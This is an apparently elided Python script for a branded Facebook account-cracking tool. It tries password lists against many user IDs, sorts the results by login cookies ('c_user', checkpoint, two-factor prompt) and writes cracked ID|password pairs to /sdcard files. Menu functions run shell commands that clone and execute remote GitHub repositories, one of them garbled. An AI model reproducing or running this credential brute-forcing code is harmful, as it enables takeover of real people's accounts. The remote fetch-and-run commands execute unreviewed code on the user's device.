...
#created by Masoom 
#team name Masoom 
#tottaly written by Masoom Ak 47 
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; MASOOM \x07')
...
ha = current.day
today = date.today()
masoom2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
import random
...
\033[1;96m:......::::.......::::::..::::::::..:::::
--------------------------------------------------
[•] AUTHOR     : \033[1;32mMASOOM\033[1;37m
[•] GITHUB     : \033[1;32madiljutt454\033[1;37m
[•] TOOL NAME  : \033[1;32mM9S00M💋\033[1;37m
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/masoom-81.txt')
...
def main():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO MASOOM🙂💔 TOOL \033[0;m] ")
    ...
    if MASOOM in ["1","01"]: 
        ...
        BOTX()
    elif masoom in ["10","10"]:
        os.system("xdg-open https://youtube.com/@masoomdevil6")
    elif masoom in ["0","00"]:
...
def File_creating():
    os.system(f"git clone https://github.com/adiljutt454/DUMP && cd DUMP && python DUMP.py")

def PROTECT():
    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/adiljutt454/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")

def CYTHONIZER():
    os.system("rm -rf Cython_Changer && git clone https://github.com/adiljutt454/Cython_Changer && cd Cython_Changer && python3 Run.py")


def BOTX():
    os.system("rm -rf BOT && git clone https://github.com/adiljutt454/ BOT && cd BOTgit clone https://github.com/adiljutt454/ BOT && cd BOT && python3 masoom.py")
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {Masoom2} : ')
    os.system('clear')
    print(logo)
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/masoom_OK.txt\n[•] CP IDS SAVE : /sdcard/masoom_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[Masoom 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio M9S00M_OK.mp3")
                print('\r\033[1;32m[M9S00M-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/M9S00M_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio M9S00M_2F.mp3")
                    print('\r\033[1;35m[M9S00M-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/M9S00M_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio M9S00M_CP.mp3")
                    print('\r\033[1;31m[M9S00M-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/M9S00M_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio M9S06_OK.mp3")
                print('\r\033[1;32m[M9S00M-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/M9S00M_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio M9S00M_2F.mp3")
                    print('\r\033[1;35m[M9S00M-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/M9S00M_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio M9S00M_CP.mp3")
                    print('\r\033[1;31m[M9S06-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/M9S00M_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[MASOOM 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio M9S00M_OK.mp3")
                    print('\r\033[1;92m[M9S00M-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/M9S00M_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio M9S00M_2F.mp3")
                        print('\r\033[1;95m[M9S00M-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/M9S00M_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            os.system("play-audio M9S00M_CP.mp3")
                            print('\r\033[1;94m M9S00M-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/M9S00M_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by mak team(owner) Masoom 
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/MASOOM-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/MASOOM-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/M9S00M-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/M9S00M-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:152]
                    ...
                    open('/sdcard/M9S00M-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[MASOOM 🔥] [%s] \33[1;97m[OK:%s{masoom2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
